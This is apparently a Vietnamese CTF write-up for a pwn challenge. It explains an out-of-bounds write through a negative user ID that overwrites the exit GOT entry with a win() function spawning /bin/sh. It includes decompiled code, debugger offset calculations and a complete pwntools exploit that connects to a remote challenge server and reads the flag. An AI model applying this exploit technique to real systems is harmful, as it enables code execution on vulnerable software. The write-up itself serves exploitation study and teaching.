## Lược qua:
**Challenge cho phép tận dụng lỗ hổng OOB (Out-of-bound) để write vào memory, cụ thể là vào các chức năng libc từ GOT để thực thi chức năng cụ thể khác.**

Nguồn tham khảo chính (của JHT): 
https://www.youtube.com/watch?v=ogTRLJ3kiIk

___
## Cách giải:
___
### Thông tin:
Challenge cung cấp file: 
```
easy.rar
```

Giải nén file với `unrar` và kiểm tra thông tin cơ bản:
```c
└─$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3d38ee665e85336ce7d15bfbb8179ac70377fd82, for GNU/Linux 3.2.0, not stripped
```
* binary chạy **64-bit**
* **dynamically linked**: sử dụng shared libc tại runtime
* **not stripped**: dễ đọc functions hơn khi disassemble binary
```c
└─$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   57 Symbols  No     0               5               vuln                                               
```
* `NO pie`: các địa chỉ cố định
* `NO canary`: có thể BOF
* `Partial RELRO`: có thể write vào GOT table

Chạy binary:

<img width="802" height="205" alt="image" src="https://github.com/user-attachments/assets/0a55ec26-af35-4d03-8a77-21455d7ea01e" />

Các functions chính:

<img width="454" height="553" alt="image" src="https://github.com/user-attachments/assets/55f6c85e-3708-451c-b64a-83dad88df690" />

Mổ xẻ trong Ghidra: 
```c
void main(EVP_PKEY_CTX *param_1)

{
  int ret_id;
  undefined8 input_id;
  int userinput;
  long id;
  
  init(param_1);
  puts("Welcome to TTV!");
  puts("First, create a user.");
  create();
  puts("User created! ID: 0");
LAB_00401634:
  menu();
  printf("Input your choice:");
  __isoc99_scanf(&DAT_00402145,&userinput);
  if (userinput == 4) {
    puts("Exiting... Goodbye!");
    exit(0);
  }
  else {
    if (4 < userinput) goto LAB_00401732;
    if (userinput == 3) {
      make_noise();
      goto LAB_00401634;
    }
    if (userinput < 4) {
      if (userinput == 1) {
        ret_id = input_player();
        id = (long)ret_id;
        printf("User created! ID: %d\n",id);
      }
      else {
        if (userinput != 2) goto LAB_00401732;
        printf("Input id to view: ");
        __isoc99_scanf(&DAT_0040205c,&input_id);
        view(input_id);
      }
      goto LAB_00401634;
    }
  }
LAB_00401732:
  puts("Invalid choice. Try again.");
  goto LAB_00401634;
}
```
Hàm win(), ko được gọi trong main():
```c
void win(void)

{
  system("/bin/sh");
  return;
}
```
___
### Khai thác:
Đáng chú ý trong main() ở đoạn:
```c
...
      if (userinput == 1) {
        ret_id = input_player();
        id = (long)ret_id;
        printf("User created! ID: %d\n",id);
      }
...
```
```c
long input_player(void)

{
  long id;
  
  printf("Input user \'s id:");
  __isoc99_scanf(&DAT_0040205c,&id);
  printf("Input user \'s name:");
  read(0,users + id * 80,80);
  return id;
}
```
Đây là nơi có lỗ hổng OOB + overwrite địa chỉ libc' functions:
* `__isoc99_scanf(&DAT_0040205c,&id);` với datatype `long id` cho phép nhận ID giá trị âm
* `read(0,users + id * 80,80);` :
  * trong đây `users` là biến global, có phân vùng cụ thể cố định
  * **chức năng:** tạo một vùng nhớ `id * 80` bytes, đọc `80 bytes` từ user
  * việc ta cấp `id < 0`, truy cập ngược lại `-(id * 80)` bytes trong bộ nhớ trước địa chỉ biến `user` trong memory, từ đấy overwrite các địa chỉ ở đó 
 
Chọn mục tiêu để overwrite với win() address:
* Tận dụng exit() từ disassembly code:
  ```c
  ...
    if (userinput == 4) {
    puts("Exiting... Goodbye!");
    exit(0);
  }
  ...
  ```
  Khi ta exit() chương trình, thay vì exit, nó sẽ gọi tới win()
* Tìm địa chỉ exit() (no PIE)
  ```
  └─$ readelf -r vuln | grep exit
  000000404078  000f00000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
  ```

Đến với bước DBG:
* Tiếp cận option 1 - input_user():
  <img width="799" height="290" alt="image" src="https://github.com/user-attachments/assets/ca79ec73-ef7c-4003-89ff-c566bd807cd3" />

* Crash binary để dbg (segfault): (sử dụng value `id < 0` và payload `"A" * 9` - giải thích ở đoạn sau)
  <img width="806" height="690" alt="image" src="https://github.com/user-attachments/assets/4e60b75a-4f34-4184-a470-8f719d0b4760" />

* Kiểm tra libc function với `got`:
  <img width="809" height="316" alt="image" src="https://github.com/user-attachments/assets/b39a8465-9e4d-4cc1-bdd4-7c4dbd7aa571" />

* Kiếm tra trong memory:
  
  <img width="757" height="440" alt="image" src="https://github.com/user-attachments/assets/be16b95e-2af3-4889-b1c7-b73a1da87a3d" />
  <img width="757" height="440" alt="image" src="https://github.com/user-attachments/assets/0f9cff4a-013e-487c-ac15-4f2d86c0743f" />
  
  * Từ bảng `got` trên, ta thấy libc functions: `_scanf@` (1) và `exit@` (2) cùng nằm trên địa chỉ `0x404070` 

* Lùi lại xa nữa trong memory:
  
  <img width="729" height="435" alt="image" src="https://github.com/user-attachments/assets/0b3581a3-0283-44e1-9ec7-0f78b0499fa4" />
  <img width="729" height="435" alt="image" src="https://github.com/user-attachments/assets/74414850-11b0-432a-abf0-92f10e5bad9d" />

  * Ta thấy payload "AAAAAAAAA" viết đè lên GOT tại `<system@>` (0x404040)
  * Vì sao? 
    * Khi dùng `read(0,users + id * 80,80);` với `id = -1, -2, ...`, ta truy cập (hay phân vùng bộ nhớ) tại `id * 80` bytes phía dưới địa chỉ từ `0x4040e0 <users>:` (hoặc phía trên của `<user>` theo sơ đồ trên gdb)
    * Nên khi cho `id = -2`, ta tịnh tiến xuống `(-2) * 80 = - 160` bytes, cũng chính là offset giữa `<system@>` và `<user>`:
      ```c
      pwndbg> p/d 0x4040e0 - 0x404040
      $2 = 160
      ```
      Và từ đây ta overwrite lên 
  * Vì sao cần `id = -2`?
    * Để có thể overwrite `exit@` tại `0x404078`, ta phải xuất phát ở đâu trước địa chỉ của nó. Tính khoảng cách từ `<user>` lùi xuống `<exit@>`:
      ```c
      # offset = <users> - <exit@>
      pwndbg> p/d 0x4040e0 - 0x404078
      $3 = 104      
      ```
      Mà, như ta đã nói: `read(0,users + id * 80,80);` lùi `id * 80` bytes trước <user>, nên ta lấy giá trị dư ra:
      ```c
      <exit@> = <users> - 104
                       (-1) * 80 = -80 (chưa đủ với)
                       (-2) * 80 = -160 (dư ra 56 bytes)
      ```
  * Vậy nên từ chỗ `<users> - 160` hay `<system@>`, ta viêt đè (padding) đến khi đạt tới `exit@` thì thay giá trị `win()` vào.

  * NHƯNG, overwrite `<system@>` sẽ crash, nên ta overwrite nhưng vẫn giữ nguyên giá trị
 
Script:
```python
from pwn import *

# --------------------------------------------------
# Setup
# --------------------------------------------------
exe = context.binary = ELF('./vuln')
context.log_level = 'info'

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        br *main+129
        br *main+208
        x/50gx 0x404070
        ''')

# Short aliases (from screenshot)
info = lambda msg: log.info(msg)
sla  = lambda msg, data: p.sendlineafter(msg, data)
sa   = lambda msg, data: p.sendafter(msg, data)
sl   = lambda data: p.sendline(data)
s    = lambda data: p.send(data)

# --------------------------------------------------
# Connection
# --------------------------------------------------
if args.REMOTE:
    p = remote("67.223.119.69", 5000)   # fill in
else:
    p = process(exe.path)

GDB()

# --------------------------------------------------
# Stage 1: Leak PIE / exe base
# --------------------------------------------------
sla(b'a user.\n', b'1')
sla(b'your choice:', b'1')
sla(b'user \'s id:', b'-2')

# Giu lai tat ca cac dia chi
payload = p64(0x0000000000401080) + p64(0x0000000000401090) + p64(0x00000000004010a0) + p64(0x00000000004010b0) + p64(0x00000000004010c0) + p64(0x00000000004010d0) + p64(0x4012b6)

sla(b'user \'s name:', payload)

# Trigger
# sla(b'your choice:', b'4')
p.sendline(b"ls; cat flag.txt")
p.interactive()
```
Chạy thử local sau đó chạy với server và được kết quả:
<img width="645" height="380" alt="image" src="https://github.com/user-attachments/assets/b8fd342e-8e59-471e-a7c4-9761c5af683e" />











